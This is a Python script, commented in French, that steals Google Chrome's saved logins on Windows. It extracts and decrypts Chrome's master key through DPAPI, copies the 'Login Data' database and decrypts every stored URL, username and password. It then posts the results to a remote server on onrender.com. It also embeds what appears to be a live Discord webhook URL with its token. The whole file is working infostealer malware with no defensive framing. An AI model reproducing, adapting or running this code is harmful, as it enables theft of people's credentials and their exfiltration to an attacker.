import os
import json
import base64
import sqlite3
import shutil
import win32crypt # pip install pywin32
from Crypto.Cipher import AES # pip install pycryptodome

import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1454123204246241431/FKBtOdjjS7WnmMIgRB4RMGEv1rZG51vm9ePVpZFf_u8YSo9vzkVUINpwnTCM8r3LLFmG"

def get_encryption_key():
    # 1. Chemin vers le fichier Local State
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")

    # 2. Lire le fichier JSON
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # 3. Extraire la clé chiffrée
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    
    # 4. Enlever les 5 premiers caractères (c'est le préfixe 'DPAPI')
    key = key[5:]
    # 5. Décrypter la clé avec l'API Windows
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(buff, key):
    try:
        # Chrome < 80 (DPAPI simple)
        return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
    except:
        pass

    try:
        # Chrome >= 80 (AES-GCM)
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception as e:
        return f"Error: {str(e)}"

def get_passwords(key):
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Login Data")
    if not os.path.exists(db_path):
        return "Database not found"
        
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename) # Copier pour éviter le verrouillage
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    data = []
    
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        
        if username and encrypted_password:
            decrypted_password = decrypt_password(encrypted_password, key)
            if len(decrypted_password) > 0:
                data.append(f"URL: {url}\nUser: {username}\nPass: {decrypted_password}\n" + "-"*30)
                
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
        
    return "\n".join(data)

# Remplacer par l'URL de votre application Render une fois déployée
# Ex: https://mon-app-b52a.onrender.com/api/report
API_URL = "https://serveur-py.onrender.com/api/report" 

def send_to_api(message):
    try:
        data = {"content": message}
        requests.post(API_URL, json=data)
    except Exception as e:
        print(f"Erreur envoi API: {e}")

if __name__ == "__main__":
    try:
        key = get_encryption_key()
        # On encode en hex ou base64 pour l'affichage safe
        key_b64 = base64.b64encode(key).decode('utf-8')
        print(f"Key Found: {key_b64}")
        
        passwords = get_passwords(key)
        
        if passwords:
            header = f"🔑 **Passwords Found:**\n"
            full_msg = header + passwords
            send_to_api(full_msg)
        else:
            send_to_api("No passwords found.")
            
    except Exception as e:
        err_msg = f"Error: {e}"
        print(err_msg)
        send_to_api(err_msg)